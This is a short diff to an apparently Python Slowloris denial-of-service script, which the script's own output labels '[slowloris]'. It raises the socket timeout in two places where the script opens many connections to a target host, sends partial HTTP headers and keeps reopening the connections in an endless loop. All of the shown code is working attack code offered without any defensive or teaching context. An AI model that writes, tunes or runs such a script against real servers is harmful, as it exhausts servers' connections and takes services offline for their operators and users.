@@ -12,7 +12,7 @@ print(f'[slowloris] Opening {SOCKET_COUNT} connections to {TARGET_IP}:{TARGET_PO
 for _ in range(SOCKET_COUNT):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(4)
+        s.settimeout(30)
         s.connect((TARGET_IP, TARGET_PORT))
         s.send(f'GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\n'.encode())
         sockets.append(s)
@@ -34,7 +34,7 @@ while True:
         sockets.remove(s)
         try:
             s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s2.settimeout(4)
+            s2.settimeout(30)
             s2.connect((TARGET_IP, TARGET_PORT))
             s2.send(f'GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\n'.encode())
             sockets.append(s2)
